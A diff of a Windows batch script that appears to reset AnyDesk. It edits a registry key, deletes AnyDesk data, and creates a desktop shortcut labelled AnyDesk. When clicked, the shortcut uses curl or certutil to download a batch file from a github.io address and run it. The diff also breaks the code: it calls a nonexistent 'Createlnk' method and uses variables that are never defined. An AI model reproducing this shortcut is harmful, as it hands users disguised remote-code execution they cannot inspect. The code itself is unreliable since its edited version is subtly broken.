@@ -64,7 +64,7 @@ reg add "HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL\Protoc
 call :check_ps
 if errorlevel 1 goto :eof
  
-call :create_shortcut
+call :create_lnk
 call :detect_install
  
 if defined _exe (
@@ -187,35 +187,38 @@ del /f /q "%TEMP%\gcapi.dll"     2>nul
 rd  /s /q "%APPDATA%\AnyDesk"    2>nul
 call :detect_install
 if not defined _exe exit /b 0
-call :create_shortcut
+call :create_lnk
 exit /b 0
  
  
-:create_shortcut
+:create_lnk
 del /f /q "%USERPROFILE%\Desktop\AnyDesk*.lnk" 2>nul
 del /f /q "%PUBLIC%\Desktop\AnyDesk*.lnk"      2>nul
 set "_lnk=%TEMP%\_lnk.ps1"
->  "%_lnk%" echo $q   = [char]34
+>  "%_lnk%" echo $url = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
+>> "%_lnk%" echo $q   = [char]34
 >> "%_lnk%" echo $aa  = [char]38 + [char]38
->> "%_lnk%" echo $url = 'https://wevertonmbrtx.github.io/anydesk/initad.bat'
->> "%_lnk%" echo $tmp = $env:TEMP + '\initad.bat'
->> "%_lnk%" echo $cmdExe = $env:SystemRoot + '\System32\cmd.exe'
->> "%_lnk%" echo $dp  = [Environment]::GetFolderPath('Desktop')
->> "%_lnk%" echo $lp  = Join-Path $dp 'AnyDesk.lnk'
+>> "%_lnk%" echo $cmd = '%SystemRoot%\System32\cmd.exe'
+>> "%_lnk%" echo $tmp = '%TEMP%\initad.bat'
+>> "%_lnk%" echo 
 >> "%_lnk%" echo if (Get-Command curl.exe -ErrorAction SilentlyContinue) {
 >> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'curl -s -o ' + $q + $tmp + $q + ' ' + $q + $url + $q + ' ' + $aa + ' call ' + $q + $tmp + $q + $q
 >> "%_lnk%" echo } else {
 >> "%_lnk%" echo     $lnkArgs = '/c ' + $q + 'certutil -urlcache -split -f ' + $q + $url + $q + ' ' + $q + $tmp + $q + ' ' + $aa + ' ' + $q + $tmp + $q + $q
 >> "%_lnk%" echo }
->> "%_lnk%" echo $ws  = New-Object -ComObject WScript.Shell
->> "%_lnk%" echo $lnk = $ws.CreateShortcut($lp)
->> "%_lnk%" echo $lnk.TargetPath  = $cmdExe
->> "%_lnk%" echo $lnk.Arguments   = $lnkArgs
->> "%_lnk%" echo $lnk.WindowStyle = 1
->> "%_lnk%" echo $lnk.Description = 'AnyDesk Reset'
->> "%_lnk%" echo $ic = Join-Path $env:LOCALAPPDATA 'AnyDeskLauncher\anydesk.ico'
->> "%_lnk%" echo if (Test-Path $ic) { $lnk.IconLocation = $ic + ',0' }
->> "%_lnk%" echo $lnk.Save()
+>> "%_lnk%" echo 
+>> "%_lnk%" echo try {
+>> "%_lnk%" echo     $ws  = New-Object -ComObject WScript.Shell
+>> "%_lnk%" echo     $lnk = $ws.Createlnk($lnkPath)
+>> "%_lnk%" echo     $lnk.TargetPath  = $cmd
+>> "%_lnk%" echo     $lnk.Arguments   = $lnkArgs
+>> "%_lnk%" echo     $lnk.WindowStyle = 1
+>> "%_lnk%" echo     $lnk.Description = 'AnyDesk Reset'
+>> "%_lnk%" echo     if (Test-Path $iconPath) { $lnk.IconLocation = "$iconPath,0" }
+>> "%_lnk%" echo     $lnk.Save()
+>> "%_lnk%" echo } catch {
+>> "%_lnk%" echo     Write-Warning "Can't create shortcut: $_"
+>> "%_lnk%" echo }
 powershell -NoProfile -ExecutionPolicy Bypass -File "%_lnk%"
 del /f /q "%_lnk%" >nul 2>&1
 exit /b 0
